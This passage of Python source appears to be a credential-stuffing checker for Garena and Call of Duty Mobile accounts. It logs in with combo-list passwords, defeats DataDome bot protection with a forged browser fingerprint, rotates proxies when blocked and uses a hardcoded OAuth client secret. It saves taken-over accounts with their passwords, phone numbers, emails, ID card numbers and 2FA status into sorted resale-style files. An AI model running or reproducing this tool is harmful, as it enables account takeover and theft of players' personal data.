            if total_with_level > 0:
                lines.append(f"━━━━━━━━━━━━━━━━━━━━")
                lines.append(f"📊 Level Distribution")
                for range_key in ["1-50", "51-100", "101-150", "151-200",
                                  "201-250", "251-300", "301-350", "351+"]:
                    count = self.level_distribution[range_key]
                    pct_lvl = (count / total_with_level * 100) if total_with_level > 0 else 0
                    bar_lvl = self._make_bar(count, total_with_level, 10)
                    lines.append(f"  {range_key:<7} : [{bar_lvl}] {count} ({pct_lvl:.1f}%)")
                lines.append(f"━━━━━━━━━━━━━━━━━━━━")

            # Server Distribution (only if we have region data)
            if self.server_distribution:
                lines.append(f"🌏 Server Distribution")
                sorted_servers = sorted(self.server_distribution.items(), key=lambda x: x[1], reverse=True)
                total_servers = sum(v for _, v in sorted_servers)
                for region, count in sorted_servers:
                    pct_srv = (count / total_servers * 100) if total_servers > 0 else 0
                    bar_srv = self._make_bar(count, total_servers, 10)
                    lines.append(f"  {region:<5} : [{bar_srv}] {count} ({pct_srv:.1f}%)")
                lines.append(f"━━━━━━━━━━━━━━━━━━━━")

            return "\n".join(lines)

    def save_progress(self, filepath="progress_resume.json"):
        """Save current progress state to file for resume capability."""
        with self.lock:
            data = {
                'valid_count': self.valid_count,
                'invalid_count': self.invalid_count,
                'clean_count': self.clean_count,
                'not_clean_count': self.not_clean_count,
                'has_codm_count': self.has_codm_count,
                'no_codm_count': self.no_codm_count,
                'total_processed': self.total_processed,
                'total_accounts': self.total_accounts,
                'current_speed': self.current_speed,
                'saved_at': time.time(),
                'start_time': self.start_time
            }
        try:
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
            return True
        except Exception:
            return False

    def load_progress(self, filepath="progress_resume.json"):
        """Load progress state from file to resume a previous session."""
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
            with self.lock:
                self.valid_count = data.get('valid_count', 0)
                self.invalid_count = data.get('invalid_count', 0)
                self.clean_count = data.get('clean_count', 0)
                self.not_clean_count = data.get('not_clean_count', 0)
                self.has_codm_count = data.get('has_codm_count', 0)
                self.no_codm_count = data.get('no_codm_count', 0)
                self.total_processed = data.get('total_processed', 0)
                self.total_accounts = data.get('total_accounts', 0)
                self.current_speed = data.get('current_speed', 0.0)
                self.start_time = data.get('start_time', time.time())
            return True
        except Exception:
            return False


def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value 
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} unique cookie keys to session.")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        "jsData": json.dumps({"ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False, "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        # Use session (which has the thread's proxy set) instead of bare requests
        # This ensures datadome is fetched through the same proxy as the thread
        response = session.post(url, headers=headers, data=data, timeout=8)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            logger.error(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            return None
    except requests.exceptions.RequestException as e:
        logger.error(f"Error getting DataDome cookie: {e}")
        return None
    
def prelogin(session, account, datadome_manager, telegram_config=None):
    url = 'https://sso.garena.com/api/prelogin'
    
    try:
        account.encode('latin-1')
    except UnicodeEncodeError:
        logger.warning(f"   ⚠️ Skipping: {account} (unsupported characters)")
        return None, None, None
    
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 2  # reduced to lower VPS load
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            if attempt > 0:
                logger.info(f"      🔄 Retry {attempt + 1}/{retries}")
            
            response = session.get(url, headers=headers, params=params, timeout=8)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:
                logger.error(f"      🚫 Access denied (403)")
                logger.error(f"      🛡️ Security check triggered")
                
                if new_cookies and attempt < retries - 2:
                    logger.info(f"      🔄 Retrying with new cookies...")
                    backoff(attempt)
                    continue
                
                if datadome_manager.handle_403(session, telegram_config=telegram_config):
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"      🚨 IP blocked - cannot continue")
                    return None, None, new_datadome
                
                if attempt < retries - 2:
                    backoff(attempt)
                    continue
                return None, None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      ✘ Invalid response format")
                logger.error(f"      📄 Could not parse server response")
                if attempt < retries - 1:
                    backoff(attempt)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                logger.error(f"      ✘ Error: {data['error']}")
                logger.error(f"      ⚠️ Server returned an error")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"      ✘ Missing authentication data")
                logger.error(f"      📋 Incomplete server response")
                return None, None, new_datadome
                
            logger.info(f"   ✔ Prelogin successful")
            
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    logger.error(f"      🚫 Access denied (403)")
                    logger.error(f"      🛡️ Security check triggered")
                    
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    pass
                    
                    if new_cookies and attempt < retries - 2:
                        logger.info(f"      🔄 Retrying with new cookies...")
                        backoff(attempt)
                        continue
                    
                    if datadome_manager.handle_403(session, telegram_config=telegram_config):
                        return "IP_BLOCKED", None, None
                    else:
                        logger.error(f"      🚨 IP blocked - cannot continue")
                        return None, None, new_cookies.get('datadome')
                        
                    if attempt < retries - 2:
                        backoff(attempt)
                        continue
                    return None, None, new_cookies.get('datadome')
                else:
                    logger.error(f"      ✘ HTTP {e.response.status_code}")
                    logger.error(f"      🖥️ Server error")
            else:
                logger.error(f"      ✘ Connection error")
                logger.error(f"      🌐 Could not reach server")
                
            if attempt < retries - 2:
                backoff(attempt)
                continue
        except requests.exceptions.ConnectionError as e:
            logger.warning(f"      🔌 Proxy dead/rate-limited: {str(e)[:80]}")
            return "CONN_ERROR", None, None

        except requests.exceptions.Timeout as e:
            logger.warning(f"      ⏱️ Proxy timeout: {str(e)[:80]}")
            return "CONN_ERROR", None, None

        except Exception as e:
            err = str(e)
            if any(kw in err for kw in ('ConnectionPool', 'HTTPSConnection', 'Max retries', 'RemoteDisconnected', 'Connection refused', 'ProxyError')):
                logger.warning(f"      🔌 Proxy connection failed: {err[:80]}")
                return "CONN_ERROR", None, None
            logger.error(f"      💥 Unexpected error: {err[:50]}")
            if attempt < retries - 2:
                backoff(attempt)
                
    return None, None, None


def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 2  # reduced to lower VPS load
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=8)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      ✘ Invalid JSON response from login")
                if attempt < retries - 1:
                    backoff(attempt)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    logger.warning(f"     ✘ Login failed: Invalid credentials")
                    logger.warning(f"         └─ 🔑 Reason: {error_msg}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"     ✘ Login failed: Captcha required")
                    logger.warning(f"         └─ 🤖 Reason: {error_msg}")
                    backoff(attempt)
                    continue
                else:
                    logger.warning(f"     ✘ Login failed: Invalid credentials")
                    logger.warning(f"         └─ ⚠️ Reason: {error_msg}")
                    return None
                    
            return sso_key
            
        except (requests.exceptions.ConnectionError, requests.exceptions.ProxyError) as e:
            logger.warning(f"      🔌 Proxy dead/rate-limited on login — removing proxy: {str(e)[:80]}")
            geo_rotator.force_rotate()
            session.proxies.update(geo_rotator.get_proxies())
            if attempt < retries - 1:
                backoff(attempt)
        except requests.RequestException as e:
            logger.error(f"      ✘ Login request failed (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                backoff(attempt)
                
    return None


def get_codm_access_token(session):
    """New OAuth flow using authorization code grant type"""
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://100082.connect.garena.com',
            'X-Requested-With': 'com.garena.game.codm',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=10)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        
        if not auth_code:
            return ('', '', '')
        
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=10)
        token_json = token_response.json()
        
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        
        return (access_token, open_id, uid)
        
    except Exception as e:
        logger.error(f'Error getting CODM access token: {e}')
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    """Try multiple methods to get CODM info"""
    try:
        # Try old callback URL
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
            'referer': 'https://auth.garena.com/'
        }
        
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=10)
        location = old_response.headers.get('Location', '')
        
        if 'err=3' in location:
            return (None, 'no_codm')
        if 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        
        # Try AOS callback
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'referer': 'https://100082.connect.garena.com/',
            'x-requested-with': 'com.garena.game.codm'
        }
        
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=10)
        aos_location = aos_response.headers.get('Location', '')
        
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        if 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        
        return (None, 'unknown_error')
        
    except Exception as e:
        logger.error(f'Error processing CODM callback: {e}')
        return (None, 'error')

def get_codm_user_info(session, token):
    """Get CODM user info using the delete token"""
    try:
        # Try to decode JWT token
        parts = token.split('.')
        if len(parts) == 3:
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            jwt_data = json.loads(decoded)
            user_data = jwt_data.get('user', {})
            if user_data:
                return {
                    'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
                    'codm_level': user_data.get('codm_level', 'N/A'),
                    'region': user_data.get('region', 'N/A'),
                    'uid': user_data.get('uid', 'N/A'),
                    'open_id': user_data.get('open_id', 'N/A'),
                    't_open_id': user_data.get('t_open_id', 'N/A')
                }
        
        # Fallback to API call
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'codm-delete-token': token,
            'origin': 'https://delete-request-aos.codm.garena.co.id',
            'referer': 'https://delete-request-aos.codm.garena.co.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'x-requested-with': 'com.garena.game.codm'
        }
        
        response = session.get(url, headers=headers, timeout=10)
        data = response.json()
        user_data = data.get('user', {})
        
        if user_data:
            return {
                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
                'codm_level': user_data.get('codm_level', 'N/A'),
                'region': user_data.get('region', 'N/A'),
                'uid': user_data.get('uid', 'N/A'),
                'open_id': user_data.get('open_id', 'N/A'),
                't_open_id': user_data.get('t_open_id', 'N/A')
            }
        else:
            return {}
            
    except Exception as e:
        logger.error(f'Error getting CODM user info: {e}')
        return {}

def check_codm_account(session, account):
    """Check if account has CODM"""
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            logger.warning('      └─ ⚠️ No CODM access token')
            return (has_codm, codm_info)
        else:
            codm_token, status = process_codm_callback(session, access_token, open_id, uid)
            if status == 'no_codm':
                logger.info('      └─ 📭 No CODM detected')
                return (has_codm, codm_info)
            else:
                if status != 'success' or not codm_token:
                    logger.warning(f'      └─ ⚠️ CODM callback failed: {status}')
                    return (has_codm, codm_info)
                else:
                    codm_info = get_codm_user_info(session, codm_token)
                    if codm_info:
                        has_codm = True
                        logger.info(f"      └─ 🎮 CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
    except Exception as e:
        logger.error(f'      └─ ✘ Error checking CODM: {e}')
    return (has_codm, codm_info)

def display_codm_info(account_details, codm_info):
    if not codm_info:
        return ""
    
    if isinstance(account_details, str):
        account_details = {
            'username': account_details,
            'nickname': 'N/A',
            'email': account_details,
            'personal': {
                'mobile_no': 'N/A',
                'country': 'N/A',
                'id_card': 'N/A'
            },
            'bind_status': 'N/A',
            'security_status': 'N/A',
            'profile': {
                'shell_balance': 'N/A'
            },
            'status': {
                'account_status': 'N/A'
            },
            'game_info': []
        }
    
    display_text = f" Username: {account_details.get('username', 'N/A')}\n"
    display_text += f" Nickname: {account_details.get('nickname', 'N/A')}\n"
    display_text += f" Email: {account_details.get('email', 'N/A')}\n"
    display_text += f" Phone: {account_details['personal'].get('mobile_no', 'N/A')}\n"
    display_text += f" Country: {account_details['personal'].get('country', 'N/A')}\n"
    display_text += f" ID Card: {account_details['personal'].get('id_card', 'N/A')}\n"
    display_text += f" Bind Status: {account_details.get('bind_status', 'N/A')}\n"
    display_text += f" Security: {account_details.get('security_status', 'N/A')}\n"
    display_text += f" Shell Balance: {account_details['profile'].get('shell_balance', 'N/A')}\n"
    display_text += f" Account Status: {account_details['status'].get('account_status', 'N/A')}\n"
    display_text += " CODM INFO:\n"
    display_text += f"   Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
    display_text += f"   Level: {codm_info.get('codm_level', 'N/A')}\n"
    display_text += f"   Region: {codm_info.get('region', 'N/A')}\n"
    display_text += f"   UID: {codm_info.get('uid', 'N/A')}\n"
    
    return display_text

def save_codm_account(account, password, codm_info, country='N/A', is_clean=False, result_folder='Results'):
    """Save CODM account to organized folder structure based on clean status, country, and level"""
    try:
        if not codm_info:
            return
            
        codm_level = int(codm_info.get('codm_level', 0))
        region = codm_info.get('region', 'N/A').upper()
        nickname = codm_info.get('codm_nickname', 'N/A')
        
        # Determine country code
        if isinstance(country, dict):
            country_code = country.get('country', 'N/A').upper() if country.get('country') else region
        else:
            country_code = country.upper() if country and country != 'N/A' else region
            
        if country_code == 'N/A' or not country_code or country_code == 'NONE':
            country_code = region if region and region != 'N/A' else 'UNKNOWN'

        # Determine level range
        if codm_level <= 50:
            level_range = "1-50"
        elif codm_level <= 100:
            level_range = "51-100"
        elif codm_level <= 150:
            level_range = "101-150"
        elif codm_level <= 200:
            level_range = "151-200"
        elif codm_level <= 250:
            level_range = "201-250"
        elif codm_level <= 300:
            level_range = "251-300"
        elif codm_level <= 350:
            level_range = "301-350"
        else:
            level_range = "351+"

        # Determine clean status folder
        clean_folder = "Clean" if is_clean else "NotClean"
        
        # Create folder structure: result_folder/Clean or NotClean/CountryCode/
        folder_path = os.path.join(result_folder, clean_folder, country_code)
        os.makedirs(folder_path, exist_ok=True)
        
        level_file = os.path.join(folder_path, f"{level_range}_accounts.txt")
        
        # Append directly — duplicates prevented upstream by combo deduplication
        if account and password:
            with open(level_file, "a", encoding="utf-8") as f:
                f.write(f"{account}:{password} | Level: {codm_level} | Nickname: {nickname} | Region: {region} | UID: {codm_info.get('uid', 'N/A')}\n")
            
    except Exception as e:
        pass


def save_clean_or_notclean(account, password, details, codm_info, result_folder='Results'):
    """Save account details to clean.txt or notclean.txt and organized CODM folders"""
    try:
        os.makedirs(result_folder, exist_ok=True)
        
        codm_nickname = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'

        username = details.get('username', account)
        email = details.get('email', 'N/A')
        email_verified_flag = details.get('email_verified') if isinstance(details.get('email_verified'), bool) else False
        email_ver = "Verified" if email_verified_flag else "Not Verified"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        mobile_bound = "Yes" if mobile and str(mobile).strip() else "No"

        fb_account = details.get('security', {}).get('facebook_account') or {}
        fb_linked_flag = details.get('security', {}).get('facebook_connected') or (True if fb_account else False)
        fb_linked = "Linked" if fb_linked_flag else "Not Linked"
        fb_uid = fb_account.get('fb_uid') if isinstance(fb_account, dict) else "N/A"
        fb = f"Linked ({fb_uid})" if fb_linked == 'Linked' else "Not Linked"
        fbl = f"https://facebook.com/{fb_uid}" if fb_linked == 'Linked' else "N/A"

        safe_avatar = details.get('profile', {}).get('avatar', 'N/A')
        shell = details.get('profile', {}).get('shell_balance', 'N/A')
        ipk = details.get('ip_for_msg', 'N/A')
        ipc = details.get('country', 'N/A')
        acc_country = details.get('personal', {}).get('country', 'N/A')

        authenticator_enabled = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
        two_step_enabled = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
        
        is_clean = details.get('is_clean', False)
        clean_status = "CLEAN" if is_clean else "NOT CLEAN"
        
        codm_info_block = f"  [+] CODM Nickname : {codm_nickname}\n  [+] CODM UID      : {codm_uid}\n  [+] CODM Level    : {codm_level}"
        
        content_to_save = f"""
[LOGIN SUCCESSFUL]
=======================================
         [ACCOUNT INFO]
  [+] Username       : {username}:{password}
  [+] Last Login     : {details.get('last_login', 'Unknown')}
  [+] Location       : {details.get('last_login_where', 'N/A')}
  [+] IP Address     : {ipk}
  [+] Country (Login): {ipc}
  [+] Country (User) : {acc_country}

         [ACCOUNT DETAILS]
  [+] Garena Shells  : {shell}
  [+] Avatar URL     : {safe_avatar}
  [+] Mobile No      : {mobile}
  [+] Email          : {email} ({email_ver})
  [+] FB Username    : {fb}
  [+] FB Profile     : {fbl}

         [GAME INFO]
{codm_info_block}

         [SECURITY BINDINGS]
  [+] Mobile Bound   : {mobile_bound}
  [+] Email Verified : {email_verified_flag}
  [+] Facebook Linked: {fb_linked}
  [+] Authenticator  : {authenticator_enabled}
  [+] 2FA Enabled    : {two_step_enabled}
  [+] Account Status : {clean_status}
  [] CONFIG BY: @Yukiii_ii
=======================================
"""
        # Save to main clean.txt or notclean.txt
        if is_clean:
            file_path = os.path.join(result_folder, 'clean.txt')
        else:
            file_path = os.path.join(result_folder, 'notclean.txt')
            
        account_exists = False
        identifier = f"  [+] Username       : {username}:{password}"
        
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                if identifier in f.read():
                    account_exists = True

        if not account_exists:
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(content_to_save.strip() + "\n\n")

        # Save to organized CODM folder structure if has CODM
        if codm_info and codm_info.get('codm_nickname') and codm_info.get('codm_nickname') != 'N/A':
            save_codm_account(account, password, codm_info, acc_country, is_clean, result_folder)

